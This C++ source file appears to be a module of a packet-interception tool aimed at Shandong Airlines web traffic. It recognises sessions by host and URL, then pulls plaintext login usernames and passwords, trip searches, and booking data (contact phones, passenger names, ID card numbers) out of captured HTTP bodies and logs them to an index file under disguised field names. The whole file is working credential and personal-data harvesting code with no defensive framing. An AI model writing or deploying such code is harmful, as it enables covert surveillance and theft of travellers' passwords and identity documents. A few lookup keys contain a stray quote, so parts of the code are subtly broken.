
#include "StdAfx.h"
#include "PlaneShanDongAirlines.h"

plane::ShanDongAirlines::ShanDongAirlines(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::ShanDongAirlines::~ShanDongAirlines()
{
	
}

int plane::ShanDongAirlines::IsShanDongAirlines(HttpSession *http_session)
{
	//登录
	if((http_session->m_Requestline.m_Host.Find("218.56.48.139:8084")!=-1) &&
		(http_session->m_Requestline.m_URI.Find("/login")!=-1) )
	{
		return kpclogin;
	}
	//国内单程 往返
	if((http_session->m_Requestline.m_Host.Find("sc.travelsky.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/scet/queryAv.do")!=-1))
	{
		return kpcticket;
	}
	//国际单程 往返
	if((http_session->m_Requestline.m_Host.Find("sc.travelsky.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/scet/queryAvInternational.do")!=-1))
	{
		return kpcticket;
	}
	//提交订单
	if((http_session->m_Requestline.m_Host.Find("sc.travelsky.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/scet/bookInfoConfirm.do")!=-1) )
	{
		return kpcorder;
	}
	return 0;
}

int plane::ShanDongAirlines::Process(const char *packet,int action)
{
	//登录
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//行程预订
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//提交订单
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	return 1;
}

//登录
int plane::ShanDongAirlines::pclogin(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	//账号
	string username = ms_->GetValueFromMapByKey("username",true);
	//密码
	string password = ms_->GetValueFromMapByKey("password",true);
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" + //账号
		"pass=" + password + "\r\n" + //密码
		"state=登录\r\n";
	WriteIndexFile();
	return 1;
}

//国内 国际 单程 往返
int plane::ShanDongAirlines::pcticket(const char *packet)
{	
	string src_data(packet);
	//精确提取数据
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//判断是国内还是国际
	string countrytype = ms_->GetValueFromMapByKey("countrytype",true);
	string adutcount,childcount,infantcount;
	//国内
	if (countrytype == "0")
	{
		//判断单程还是往返
		string travelType = ms_->GetValueFromMapByKey("travelType",true);
		if (travelType == "0")
		{		
			adutcount = ms_->GetValueFromMapByKey("adultNum",true);
			childcount = ms_->GetValueFromMapByKey("childNum",true);
			//出发日期
			string deptDt = ms_->GetValueFromMapByKey("takeoffDate",true);
			//出发地
			string deptCdTxt = ms_->GetValueFromMapByKey("cityNameOrg",true);
			//目的地
			string arrCdTxt = ms_->GetValueFromMapByKey("cityNameDes",true);
			output_text_ =
				"netmark=" +adutcount + "\r\n" +	//成年人数
				"onick=" +	childcount + "\r\n" +	//儿童人数
				"nick=" +	deptCdTxt + "\r\n" +	//出发地
				"msg=" + 	arrCdTxt + "\r\n" +		//目的地 
				"servername=" + deptDt + "\r\n" +	//出发日期
				"state=国内单程查询\r\n";
			WriteIndexFile();
		}
		if (travelType == "1")
		{
			adutcount = ms_->GetValueFromMapByKey("adultNum",true);
			childcount = ms_->GetValueFromMapByKey("childNum",true);
			//出发日期
			string deptDt = ms_->GetValueFromMapByKey("takeoffDate",true);
			//返程日期
			string deptDtRe = ms_->GetValueFromMapByKey("returnDate",true);
			//出发地
			string deptCdTxt = ms_->GetValueFromMapByKey("cityNameOrg",true);
			//目的地
			string arrCdTxt = ms_->GetValueFromMapByKey("cityNameDes",true);
			output_text_ =
				"netmark=" +	adutcount + "\r\n" + //成年人数
				"onick=" +	childcount + "\r\n" +	//儿童人数
				"nick=" +	deptCdTxt + "\r\n" +	//出发地
				"msg=" + 	arrCdTxt + "\r\n" +		//目的地 
				"servername=" + deptDt + "\r\n" +	//出发日期
				"appname=" + deptDtRe + "\r\n" +	//返程日期
				"state=国内往返查询\r\n";
			WriteIndexFile();
		}
	}
	//国际
	if (countrytype == "1")
	{
		//判断单程还是往返
		string travelType = ms_->GetValueFromMapByKey("travelType",true);
		if (travelType == "0")
		{		
			//出发日期
			string deptDt = ms_->GetValueFromMapByKey("takeoffDate",true);
			//出发地
			string deptCdTxt = ms_->GetValueFromMapByKey("cityNameOrg",true);
			//目的地
			string arrCdTxt = ms_->GetValueFromMapByKey("'cityNameDes",true);
			output_text_ =
				"nick=" +	deptCdTxt + "\r\n" +	//出发地
				"msg=" + 	arrCdTxt + "\r\n" +		//目的地 
				"servername=" + deptDt + "\r\n" +	//出发日期
				"state=国际单程查询\r\n";
			WriteIndexFile();
		}
		if (travelType == "1")
		{
			//出发日期
			string deptDt = ms_->GetValueFromMapByKey("takeoffDate",true);
			//返程日期
			string deptDtRe = ms_->GetValueFromMapByKey("returnDate",true);
			//出发地
			string deptCdTxt = ms_->GetValueFromMapByKey("cityNameOrg",true);
			//目的地
			string arrCdTxt = ms_->GetValueFromMapByKey("'cityNameDes",true);
			output_text_ =
				"nick=" +	deptCdTxt + "\r\n" + //出发地
				"msg=" + 	arrCdTxt + "\r\n" + //目的地 
				"servername=" + deptDt + "\r\n" +//出发日期
				"appname=" + deptDtRe + "\r\n" + //返程日期
				"state=国际往返查询\r\n";
			WriteIndexFile();
		}		
	}
	return 1;
}

//提交订单
int plane::ShanDongAirlines::pcorder(const char *packet)
{
	//信息提取待完善
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//联系人信息
	string contactName,contactMobile,contackEmail;
	string contactInfo = src_data.substr(src_data.find("contactName"));
	ms_->SplitStringToMap(contactInfo,'&','=');

	contactName = ms_->GetValueFromMapByKey("contactName",true);
	contactMobile = ms_->GetValueFromMapByKey("contactmobile",true);
	contackEmail = ms_->GetValueFromMapByKey("contactemail",true);
	//乘客信息 
	string passengerName,passengerIDtypeTemp,passengerIDtype,passengerIDcard,passengerTel;
	string passengerInfo = src_data.substr(0,src_data.find("&passType"));
	while(passengerInfo.find("luggo") != string::npos)
	{
		string passengerInfoTemp = passengerInfo.substr(0,passengerInfo.find("luggo"));
		ms_->SplitStringToMap(passengerInfoTemp,'&','=');
		//乘客姓名
		passengerName = ms_->GetValueFromMapByKey("passName",true);
		//乘客电话
		passengerTel = ms_->GetValueFromMapByKey("contactMobilePerson",true);
		//乘客证件号
		passengerIDcard = ms_->GetValueFromMapByKey("idNo",true);

		output_text_ =
			"mid=" + 	contactName + "\r\n" +		//联系人姓名
			"oid=" + 	contactMobile + "\r\n" +	//联系人电话
			"msgtype=" + passengerName + "\r\n" +	//乘客姓名
			"clientmsg=" + passengerTel + "\r\n" +	//乘客电话
			"subject=" + passengerIDcard + "\r\n" + //乘客证件号
			"state=提交订单\r\n";
		WriteIndexFile();
		passengerInfo = passengerInfo.substr(passengerInfo.find("luggo") + strlen("luggo"));
	}
	return 1;
}
